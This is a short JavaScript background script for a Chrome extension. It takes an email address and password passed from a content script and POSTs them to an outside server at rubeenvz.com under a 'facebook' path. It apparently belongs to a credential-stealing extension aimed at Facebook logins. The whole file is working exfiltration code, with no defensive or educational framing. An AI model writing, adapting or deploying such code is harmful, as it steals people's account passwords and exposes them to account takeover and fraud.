chrome.runtime.onInstalled.addListener(() => {
  console.log(`I'm installed...`);
});

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    if (request.contentScriptQuery == 'saveData') {
      console.log('Sending data...')
      var formData = new FormData();
      formData.append('email', request.data.email);
      formData.append('password', request.data.password);
      fetch('https://rubeenvz.com/facebook/saveData.php', {
        method: 'POST',
        body: formData
      })
      .then(response => response.text())
      .then(text => {
        console.log('Getting response...')
        sendResponse(text)
      })
      .catch(error => {
        console.log('Error:' + error)
      })
      return true;
    }
  }
);